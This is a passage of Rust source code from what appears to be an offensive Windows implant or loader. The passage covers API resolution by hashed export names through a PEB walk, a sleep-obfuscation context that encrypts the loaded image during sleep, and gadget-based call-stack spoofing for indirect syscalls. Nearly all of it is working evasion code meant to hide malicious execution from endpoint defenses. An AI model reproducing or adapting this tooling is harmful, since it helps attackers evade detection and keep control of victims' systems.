        &self,
        Memory: PVOID,
        MemorySize: ULONG,
        OptionFlags: ULONG,
    ) -> NTSTATUS {
        let f: FnSystemFunction041 = transmute(self.SystemFunction041_ptr);
        f(Memory, MemorySize, OptionFlags)
    }
}

/// Runtime context for sleep obfuscation.
///
/// Configured by the caller before invoking a sleep technique. Holds the image region
/// to encrypt, the sleep duration, and per-section protection state for RX/RW transitions.
pub struct SleepContext {
    /// Non-zero if CFG (Control Flow Guard) is enforced in this process.
    pub cfg: DWORD,
    /// Sleep duration in milliseconds.
    pub dw_milliseconds: DWORD,
    /// Base address of the memory region to encrypt during sleep.
    pub buffer: *mut u8,
    /// Length of the memory region in bytes.
    pub length: usize,
    /// Size of allocated shellcode stubs (for cleanup).
    pub stub_size: usize,
    /// Private heap handle for stub allocations.
    pub heap: HANDLE,
    /// Number of valid entries in `sections`.
    pub num_sections: usize,
    /// Per-section protection tracking (up to 20 sections).
    pub sections: [MemorySection; 20],
}

/// Tracks a memory section's address, size, and protection state.
///
/// Used to save/restore page protections across the encrypt-sleep-decrypt cycle.
#[repr(C)]
pub struct MemorySection {
    /// Virtual address of the section.
    pub base_address: PVOID,
    /// Size of the section in bytes.
    pub size: SIZE_T,
    /// Current page protection (`PAGE_*` constant).
    pub current_protect: DWORD,
    /// Protection to restore after unmasking.
    pub previous_protect: DWORD,
}

impl Api {
    /// Construct a new [`Api`] instance with all function pointers resolved from the PEB.
    ///
    /// Walks the PEB loader data to find ntdll, kernel32, kernelbase, and advapi32
    /// base addresses, then resolves every function pointer by DJB2 hash of its export
    /// name. If advapi32 is not already loaded, it is loaded via `LdrLoadDll`.
    /// SystemFunction032/040/041 are resolved by name string rather than hash because
    /// they are undocumented exports not present in all hash databases.
    ///
    /// # Returns
    ///
    /// A fully initialized `Api`. If ntdll or kernel32 cannot be found, returns
    /// early with all function pointers null -- callers should check `ntdll.handle != 0`.
    #[link_section = ".text$E"]
    pub fn new() -> Self {
        unsafe {
            let mut api = Api {
                ntdll: NtdllModule {
                    handle: 0,
                    size: 0,
                    #[cfg(feature = "spoof-uwd")]
                    spoof_config: core::mem::zeroed(),
                    #[cfg(all(feature = "spoof-uwd", feature = "spoof-syscall"))]
                    syscall_spoof_config: core::mem::zeroed(),
                    NtGetContextThread_ptr: null_mut(),
                    NtSetContextThread_ptr: null_mut(),
                    NtResumeThread_ptr: null_mut(),
                    NtWaitForSingleObject_ptr: null_mut(),
                    RtlUserThreadStart_ptr: null_mut(),
                    RtlCreateUserThread_ptr: null_mut(),
                    NtAllocateVirtualMemory_ptr: null_mut(),
                    NtFreeVirtualMemory_ptr: null_mut(),
                    NtProtectVirtualMemory_ptr: null_mut(),
                    RtlCreateHeap_ptr: null_mut(),
                    LdrGetProcedureAddress_ptr: null_mut(),
                    LdrLoadDll_ptr: null_mut(),
                    LdrUnloadDll_ptr: null_mut(),
                    NtAlertResumeThread_ptr: null_mut(),
                    NtClose_ptr: null_mut(),
                    NtContinue_ptr: null_mut(),
                    NtCreateEvent_ptr: null_mut(),
                    NtCreateThreadEx_ptr: null_mut(),
                    NtOpenThread_ptr: null_mut(),
                    NtQueryInformationProcess_ptr: null_mut(),
                    NtQueueApcThread_ptr: null_mut(),
                    NtSetEvent_ptr: null_mut(),
                    NtSignalAndWaitForSingleObject_ptr: null_mut(),
                    NtTerminateThread_ptr: null_mut(),
                    NtTestAlert_ptr: null_mut(),
                    NtDuplicateObject_ptr: null_mut(),
                    RtlAllocateHeap_ptr: null_mut(),
                    RtlExitUserThread_ptr: null_mut(),
                    RtlFreeHeap_ptr: null_mut(),
                    RtlInitAnsiString_ptr: null_mut(),
                    RtlInitUnicodeString_ptr: null_mut(),
                    RtlAnsiStringToUnicodeString_ptr: null_mut(),
                    RtlFreeUnicodeString_ptr: null_mut(),
                    RtlRandomEx_ptr: null_mut(),
                    RtlWalkHeap_ptr: null_mut(),
                    RtlCreateTimerQueue_ptr: null_mut(),
                    RtlDeleteTimerQueue_ptr: null_mut(),
                    RtlCreateTimer_ptr: null_mut(),
                    RtlCaptureContext_ptr: null_mut(),
                    RtlAcquireSRWLockExclusive_ptr: null_mut(),
                    ZwWaitForWorkViaWorkerFactory_ptr: null_mut(),
                    NtLockVirtualMemory_ptr: null_mut(),
                    TpAllocPool_ptr: null_mut(),
                    TpSetPoolStackInformation_ptr: null_mut(),
                    TpSetPoolMinThreads_ptr: null_mut(),
                    TpSetPoolMaxThreads_ptr: null_mut(),
                    TpAllocTimer_ptr: null_mut(),
                    TpSetTimer_ptr: null_mut(),
                    TpAllocWait_ptr: null_mut(),
                    TpSetWait_ptr: null_mut(),
                    TpReleaseCleanupGroup_ptr: null_mut(),
                    #[cfg(feature = "debug-dbgprint")]
                    DbgPrint_ptr: null_mut(),
                },
                kernel32: Kernel32Module {
                    handle: 0,
                    size: 0,
                    #[cfg(feature = "spoof-uwd")]
                    spoof_config: core::mem::zeroed(),
                    LoadLibraryA_ptr: null_mut(),
                    LoadLibraryExA_ptr: null_mut(),
                    GetProcAddress_ptr: null_mut(),
                    WaitForSingleObject_ptr: null_mut(),
                    WaitForSingleObjectEx_ptr: null_mut(),
                    Sleep_ptr: null_mut(),
                    CreateToolhelp32Snapshot_ptr: null_mut(),
                    Thread32First_ptr: null_mut(),
                    Thread32Next_ptr: null_mut(),
                    OpenThread_ptr: null_mut(),
                    DuplicateHandle_ptr: null_mut(),
                    GetThreadContext_ptr: null_mut(),
                    SetThreadContext_ptr: null_mut(),
                    SetEvent_ptr: null_mut(),
                    VirtualProtect_ptr: null_mut(),
                    VirtualAlloc_ptr: null_mut(),
                    VirtualFree_ptr: null_mut(),
                    GetCurrentProcess_ptr: null_mut(),
                    GetCurrentProcessId_ptr: null_mut(),
                    GetCurrentThreadId_ptr: null_mut(),
                    BaseThreadInitThunk_ptr: null_mut(),
                    EnumDateFormatsExA_ptr: null_mut(),
                    ConvertThreadToFiber_ptr: null_mut(),
                    ConvertFiberToThread_ptr: null_mut(),
                    CreateFiber_ptr: null_mut(),
                    DeleteFiber_ptr: null_mut(),
                    SwitchToFiber_ptr: null_mut(),
                    CloseThreadpool_ptr: null_mut(),
                    DisableThreadLibraryCalls_ptr: null_mut(),
                },
                kernelbase: KernelBaseModule {
                    handle: 0,
                    size: 0,
                    #[cfg(feature = "spoof-uwd")]
                    spoof_config: core::mem::zeroed(),
                    SetProcessValidCallTargets_ptr: null_mut(),
                },
                advapi: AdvapiModule {
                    handle: 0,
                    size: 0,
                    SystemFunction032_ptr: null_mut(),
                    SystemFunction040_ptr: null_mut(),
                    SystemFunction041_ptr: null_mut(),
                    enckey: [0; KEY_SIZE],
                },
                sleep: SleepContext {
                    cfg: 0,
                    dw_milliseconds: 0,
                    buffer: null_mut(),
                    length: 0,
                    stub_size: 0,
                    heap: null_mut(),
                    num_sections: 0,
                    sections: core::mem::zeroed(),
                },
            };

            api.ntdll.handle = get_loaded_module_by_hash(hash_str!("ntdll.dll"));
            api.kernel32.handle = get_loaded_module_by_hash(hash_str!("kernel32.dll"));
            api.kernelbase.handle = get_loaded_module_by_hash(hash_str!("kernelbase.dll"));
            api.advapi.handle = get_loaded_module_by_hash(hash_str!("advapi32.dll"));

            if api.ntdll.handle == 0 || api.kernel32.handle == 0 {
                return api;
            }

            api.ntdll.size = module_size(api.ntdll.handle);
            api.kernel32.size = module_size(api.kernel32.handle);
            if api.kernelbase.handle != 0 {
                api.kernelbase.size = module_size(api.kernelbase.handle);
            }
            if api.advapi.handle != 0 {
                api.advapi.size = module_size(api.advapi.handle);
            }

            #[cfg(feature = "debug-dbgprint")]
            {
                api.ntdll.DbgPrint_ptr = transmute(get_export_by_hash(
                    api.ntdll.handle,
                    hash_str!("DbgPrint") as usize,
                ));
            }

            api.ntdll.NtGetContextThread_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("NtGetContextThread") as usize,
            ));
            api.ntdll.NtSetContextThread_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("NtSetContextThread") as usize,
            ));
            api.ntdll.NtResumeThread_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("NtResumeThread") as usize,
            ));
            api.ntdll.NtWaitForSingleObject_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("NtWaitForSingleObject") as usize,
            ));
            api.ntdll.RtlUserThreadStart_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("RtlUserThreadStart") as usize,
            ));
            api.ntdll.RtlCreateUserThread_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("RtlCreateUserThread") as usize,
            ));
            api.ntdll.NtAllocateVirtualMemory_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("ZwAllocateVirtualMemory") as usize,
            ));
            api.ntdll.NtFreeVirtualMemory_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("ZwFreeVirtualMemory") as usize,
            ));
            api.ntdll.NtProtectVirtualMemory_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("ZwProtectVirtualMemory") as usize,
            ));
            api.ntdll.RtlCreateHeap_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("RtlCreateHeap") as usize,
            ));
            api.ntdll.LdrGetProcedureAddress_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("LdrGetProcedureAddress") as usize,
            ));
            api.ntdll.LdrLoadDll_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("LdrLoadDll") as usize,
            ));
            api.ntdll.LdrUnloadDll_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("LdrUnloadDll") as usize,
            ));
            api.ntdll.NtAlertResumeThread_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("NtAlertResumeThread") as usize,
            ));
            api.ntdll.NtClose_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("NtClose") as usize,
            ));
            api.ntdll.NtContinue_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("NtContinue") as usize,
            ));
            api.ntdll.NtCreateEvent_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("NtCreateEvent") as usize,
            ));
            api.ntdll.NtCreateThreadEx_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("NtCreateThreadEx") as usize,
            ));
            api.ntdll.NtOpenThread_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("NtOpenThread") as usize,
            ));
            api.ntdll.NtQueryInformationProcess_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("NtQueryInformationProcess") as usize,
            ));
            api.ntdll.NtQueueApcThread_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("NtQueueApcThread") as usize,
            ));
            api.ntdll.NtSetEvent_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("NtSetEvent") as usize,
            ));
            api.ntdll.NtSignalAndWaitForSingleObject_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("NtSignalAndWaitForSingleObject") as usize,
            ));
            api.ntdll.NtTerminateThread_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("NtTerminateThread") as usize,
            ));
            api.ntdll.NtTestAlert_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("NtTestAlert") as usize,
            ));
            api.ntdll.NtDuplicateObject_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("NtDuplicateObject") as usize,
            ));
            api.ntdll.RtlAllocateHeap_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("RtlAllocateHeap") as usize,
            ));
            api.ntdll.RtlExitUserThread_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("RtlExitUserThread") as usize,
            ));
            api.ntdll.RtlFreeHeap_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("RtlFreeHeap") as usize,
            ));
            api.ntdll.RtlInitAnsiString_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("RtlInitAnsiString") as usize,
            ));
            api.ntdll.RtlInitUnicodeString_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("RtlInitUnicodeString") as usize,
            ));
            api.ntdll.RtlAnsiStringToUnicodeString_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("RtlAnsiStringToUnicodeString") as usize,
            ));
            api.ntdll.RtlFreeUnicodeString_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("RtlFreeUnicodeString") as usize,
            ));
            api.ntdll.RtlRandomEx_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("RtlRandomEx") as usize,
            ));
            api.ntdll.RtlWalkHeap_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("RtlWalkHeap") as usize,
            ));
            api.ntdll.RtlCreateTimerQueue_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("RtlCreateTimerQueue") as usize,
            ));
            api.ntdll.RtlDeleteTimerQueue_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("RtlDeleteTimerQueue") as usize,
            ));
            api.ntdll.RtlCreateTimer_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("RtlCreateTimer") as usize,
            ));
            api.ntdll.RtlCaptureContext_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("RtlCaptureContext") as usize,
            ));
            api.ntdll.RtlAcquireSRWLockExclusive_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("RtlAcquireSRWLockExclusive") as usize,
            ));
            api.ntdll.ZwWaitForWorkViaWorkerFactory_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("ZwWaitForWorkViaWorkerFactory") as usize,
            ));
            api.ntdll.NtLockVirtualMemory_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("NtLockVirtualMemory") as usize,
            ));
            api.ntdll.TpAllocPool_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("TpAllocPool") as usize,
            ));
            api.ntdll.TpSetPoolStackInformation_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("TpSetPoolStackInformation") as usize,
            ));
            api.ntdll.TpSetPoolMinThreads_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("TpSetPoolMinThreads") as usize,
            ));
            api.ntdll.TpSetPoolMaxThreads_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("TpSetPoolMaxThreads") as usize,
            ));
            api.ntdll.TpAllocTimer_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("TpAllocTimer") as usize,
            ));
            api.ntdll.TpSetTimer_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("TpSetTimer") as usize,
            ));
            api.ntdll.TpAllocWait_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("TpAllocWait") as usize,
            ));
            api.ntdll.TpSetWait_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("TpSetWait") as usize,
            ));
            api.ntdll.TpReleaseCleanupGroup_ptr = transmute(get_export_by_hash(
                api.ntdll.handle,
                hash_str!("TpReleaseCleanupGroup") as usize,
            ));

            api.kernel32.LoadLibraryA_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("LoadLibraryA") as usize,
            ));
            api.kernel32.LoadLibraryExA_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("LoadLibraryExA") as usize,
            ));
            api.kernel32.GetProcAddress_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("GetProcAddress") as usize,
            ));
            api.kernel32.WaitForSingleObject_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("WaitForSingleObject") as usize,
            ));
            api.kernel32.WaitForSingleObjectEx_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("WaitForSingleObjectEx") as usize,
            ));
            api.kernel32.Sleep_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("Sleep") as usize,
            ));
            api.kernel32.CreateToolhelp32Snapshot_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("CreateToolhelp32Snapshot") as usize,
            ));
            api.kernel32.Thread32First_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("Thread32First") as usize,
            ));
            api.kernel32.Thread32Next_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("Thread32Next") as usize,
            ));
            api.kernel32.OpenThread_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("OpenThread") as usize,
            ));
            api.kernel32.DuplicateHandle_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("DuplicateHandle") as usize,
            ));
            api.kernel32.GetThreadContext_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("GetThreadContext") as usize,
            ));
            api.kernel32.SetThreadContext_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("SetThreadContext") as usize,
            ));
            api.kernel32.SetEvent_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("SetEvent") as usize,
            ));
            api.kernel32.VirtualProtect_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("VirtualProtect") as usize,
            ));
            api.kernel32.VirtualAlloc_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("VirtualAlloc") as usize,
            ));
            api.kernel32.VirtualFree_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("VirtualFree") as usize,
            ));
            api.kernel32.GetCurrentProcess_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("GetCurrentProcess") as usize,
            ));
            api.kernel32.GetCurrentProcessId_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("GetCurrentProcessId") as usize,
            ));
            api.kernel32.GetCurrentThreadId_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("GetCurrentThreadId") as usize,
            ));
            api.kernel32.BaseThreadInitThunk_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("BaseThreadInitThunk") as usize,
            ));
            api.kernel32.EnumDateFormatsExA_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("EnumDateFormatsExA") as usize,
            ));
            api.kernel32.ConvertThreadToFiber_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("ConvertThreadToFiber") as usize,
            ));
            api.kernel32.ConvertFiberToThread_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("ConvertFiberToThread") as usize,
            ));
            api.kernel32.CreateFiber_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("CreateFiber") as usize,
            ));
            api.kernel32.DeleteFiber_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("DeleteFiber") as usize,
            ));
            api.kernel32.SwitchToFiber_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("SwitchToFiber") as usize,
            ));
            api.kernel32.CloseThreadpool_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("CloseThreadpool") as usize,
            ));
            api.kernel32.DisableThreadLibraryCalls_ptr = transmute(get_export_by_hash(
                api.kernel32.handle,
                hash_str!("DisableThreadLibraryCalls") as usize,
            ));

            if api.kernelbase.handle != 0 {
                api.kernelbase.SetProcessValidCallTargets_ptr = transmute(get_export_by_hash(
                    api.kernelbase.handle,
                    hash_str!("SetProcessValidCallTargets") as usize,
                ));
            }

            if api.advapi.handle == 0
                && !api.ntdll.LdrLoadDll_ptr.is_null()
                && !api.ntdll.RtlInitUnicodeString_ptr.is_null()
            {
                let rtl_init_unicode: FnRtlInitUnicodeString =
                    transmute(api.ntdll.RtlInitUnicodeString_ptr);
                let ldr_load_dll: FnLdrLoadDll = transmute(api.ntdll.LdrLoadDll_ptr);

                let mut unicode: UNICODE_STRING = core::mem::zeroed();
                let mut advapi_handle: PVOID = null_mut();

                let advapi_name: [u16; 13] = [
                    b'a' as u16,
                    b'd' as u16,
                    b'v' as u16,
                    b'a' as u16,
                    b'p' as u16,
                    b'i' as u16,
                    b'3' as u16,
                    b'2' as u16,
                    b'.' as u16,
                    b'd' as u16,
                    b'l' as u16,
                    b'l' as u16,
                    0,
                ];

                rtl_init_unicode(&mut unicode, advapi_name.as_ptr());
                ldr_load_dll(null_mut(), null_mut(), &mut unicode, &mut advapi_handle);
                api.advapi.handle = advapi_handle as usize;

                if api.advapi.handle != 0 {
                    api.advapi.size = module_size(api.advapi.handle);
                }
            }

            if api.advapi.handle != 0
                && !api.ntdll.LdrGetProcedureAddress_ptr.is_null()
                && !api.ntdll.RtlInitAnsiString_ptr.is_null()
            {
                let rtl_init_ansi: FnRtlInitAnsiString = transmute(api.ntdll.RtlInitAnsiString_ptr);
                let ldr_get_proc: FnLdrGetProcedureAddress =
                    transmute(api.ntdll.LdrGetProcedureAddress_ptr);

                let mut ansi: STRING = core::mem::zeroed();
                let mut sys_fn: PVOID = null_mut();
                let sys_name = b"SystemFunction032\0";

                rtl_init_ansi(&mut ansi, sys_name.as_ptr() as _);
                ldr_get_proc(api.advapi.handle as PVOID, &mut ansi, 0, &mut sys_fn);
                api.advapi.SystemFunction032_ptr = sys_fn as *mut FnSystemFunction032;

                let mut sys_fn040: PVOID = null_mut();
                let sys_name040 = b"SystemFunction040\0";
                rtl_init_ansi(&mut ansi, sys_name040.as_ptr() as _);
                ldr_get_proc(api.advapi.handle as PVOID, &mut ansi, 0, &mut sys_fn040);
                api.advapi.SystemFunction040_ptr = sys_fn040 as *mut FnSystemFunction040;

                let mut sys_fn041: PVOID = null_mut();
                let sys_name041 = b"SystemFunction041\0";
                rtl_init_ansi(&mut ansi, sys_name041.as_ptr() as _);
                ldr_get_proc(api.advapi.handle as PVOID, &mut ansi, 0, &mut sys_fn041);
                api.advapi.SystemFunction041_ptr = sys_fn041 as *mut FnSystemFunction041;
            }

            api
        }
    }

    /// Build call-stack spoofing configurations for all module wrappers.
    ///
    /// Scans ntdll, kernel32, and kernelbase for suitable frame-faking gadgets
    /// and populates each module's `spoof_config` (and optionally `syscall_spoof_config`
    /// for indirect syscall dispatch). Falls back through multiple source combinations
    /// if the preferred gadget sources are not available.
    ///
    /// # Safety
    ///
    /// All module handles and sizes must be valid (i.e., [`Api::new`] must have
    /// succeeded). Must be called before any spoofed API calls are made.
    #[cfg(feature = "spoof-uwd")]
    #[link_section = ".text$E"]
    pub unsafe fn build_spoof_configs(&mut self) {
        let ntdll_base = self.ntdll.handle;
        let k32_base = self.kernel32.handle;
        let kb_base = self.kernelbase.handle;
        let rtl_start = self.ntdll.RtlUserThreadStart_ptr as usize;
        let base_thunk = self.kernel32.BaseThreadInitThunk_ptr as usize;

        let build = |ff_src, sf_src| {
            crate::spoof::uwd::build_config(
                ntdll_base, k32_base, ff_src, sf_src, kb_base, rtl_start, base_thunk,
            )
        };

        if let Some(cfg) = build(k32_base, kb_base).or_else(|| build(kb_base, kb_base)) {
            core::ptr::write(&mut self.ntdll.spoof_config, cfg);
        }

        #[cfg(feature = "spoof-syscall")]
        {
            let syscall_build = |ff_src, sf_src, gs| {
                crate::spoof::uwd::build_syscall_config(
                    ntdll_base, k32_base, ff_src, sf_src, gs, rtl_start, base_thunk,
                )
            };
            if let Some(cfg) = syscall_build(kb_base, ntdll_base, ntdll_base) {
                #[cfg(feature = "debug-dbgprint")]
                crate::dbg_print!(
                    self,
                    b"[LDR] syscall_config: kb+ntdll frames, ntdll gadgets\n\0"
                );
                core::ptr::write(&mut self.ntdll.syscall_spoof_config, cfg);
            } else if let Some(cfg) = syscall_build(kb_base, ntdll_base, kb_base) {
                #[cfg(feature = "debug-dbgprint")]
                crate::dbg_print!(
                    self,
                    b"[LDR] syscall_config: kb+ntdll frames, kb gadgets\n\0"
                );
                core::ptr::write(&mut self.ntdll.syscall_spoof_config, cfg);
            } else if let Some(cfg) = syscall_build(kb_base, kb_base, kb_base) {
                #[cfg(feature = "debug-dbgprint")]
                crate::dbg_print!(self, b"[LDR] syscall_config: kb+kb (fallback)\n\0");
                core::ptr::write(&mut self.ntdll.syscall_spoof_config, cfg);
            }
        }

        if let Some(cfg) = build(k32_base, k32_base).or_else(|| build(kb_base, kb_base)) {
            core::ptr::write(&mut self.kernel32.spoof_config, cfg);
        }

        if let Some(cfg) = build(k32_base, kb_base).or_else(|| build(kb_base, kb_base)) {
            core::ptr::write(&mut self.kernelbase.spoof_config, cfg);
        }
    }

    /// Zero the entire `Api` struct, scrubbing all resolved pointers and sleep context.
    ///
    /// # Safety
    ///
    /// After this call, no wrapper methods may be called -- all function pointers
    /// will be null.
    #[inline(always)]
    pub unsafe fn zero(&mut self) {
        let ptr = self as *mut Api as *mut u8;
        let size = core::mem::size_of::<Api>();
        memzero(ptr, size as _);
    }
}
